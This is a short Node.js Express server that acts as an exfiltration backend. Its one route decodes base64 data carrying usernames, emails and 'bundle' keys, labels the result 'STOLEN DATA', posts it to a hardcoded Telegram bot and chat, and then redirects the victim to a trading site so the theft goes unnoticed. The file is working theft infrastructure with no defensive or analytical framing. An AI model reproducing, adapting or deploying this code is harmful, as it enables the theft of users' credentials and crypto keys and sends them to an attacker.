const express = require('express');
const fetch = require('node-fetch');
const app = express();

const TG_BOT = '7641165749:AAFla0YZ3Z7PUViwZQaq8a0W2-ydT7n0bJc';
const TG_CHAT = '7680513699';

app.get('/data/:b64', async (req, res) => {
  try {
    const decoded = Buffer.from(req.params.b64, 'base64').toString();
    const data = JSON.parse(decoded);
    
    console.log('Received data:', data);
    
    const message = `
🚨 STOLEN DATA

User: ${data.user?.username || 'N/A'}
Email: ${data.user?.email || 'N/A'}
Bundle Key: ${data.bundle || 'N/A'}
sBundles: ${data.sBundles || 'N/A'}
eBundles: ${data.eBundles || 'N/A'}
Site: ${data.site || 'N/A'}
    `;
    
    await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TG_CHAT,
        text: message
      })
    });
    
    console.log('Sent to Telegram');
    res.redirect('https://axiom.trade/discover');
    
  } catch (e) {
    console.error('Error:', e);
    res.status(500).send('Error');
  }
});

app.listen(3000, () => {
  console.log('Server running on http://localhost:3000');
});
